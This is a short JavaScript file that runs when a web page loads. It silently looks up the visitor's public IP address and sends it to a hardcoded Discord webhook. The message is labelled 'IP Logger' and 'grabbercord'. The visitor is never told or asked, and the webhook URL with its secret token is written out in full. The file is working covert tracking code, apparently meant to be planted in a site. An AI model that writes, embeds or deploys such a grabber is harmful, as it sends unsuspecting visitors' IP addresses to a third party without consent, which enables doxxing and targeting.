document.addEventListener('DOMContentLoaded', () => {
    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error fetching IP:', error);
            return null;
        }
    }

    async function sendToWebhook(ip) {
        const webhookUrl = 'https://discord.com/api/webhooks/1278268571264356352/cFEWfxj1T4qdAZmJu1xDtKY8DXFwQVgciofvP9u2Fg6RRszHAmEGF_7yP6hKoRH5q8tj';

        if (ip) {
            const embed = {
                content: null,
                embeds: [
                    {
                        title: 'LOGGED IP.',
                        description: `Powerd by grabbercord`,
                        fields: [
                            {
                                name: 'IP',
                                value: ip,
                                inline: true
                            }
                        ],
                        color: 0x4c00b0,
                        timestamp: new Date().toISOString(),
                        footer: {
                            text: 'IP Logger'
                        }
                    }
                ],
                "username": "heckerのちから。",
            };

            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(embed)
                });
                console.log('IP address sent to webhook');
            } catch (error) {
                console.error('Error sending to webhook:', error);
            }
        }
    }

    async function main() {
        const ip = await getIP();
        if (ip) {
            await sendToWebhook(ip);
        }
    }

    main();
});
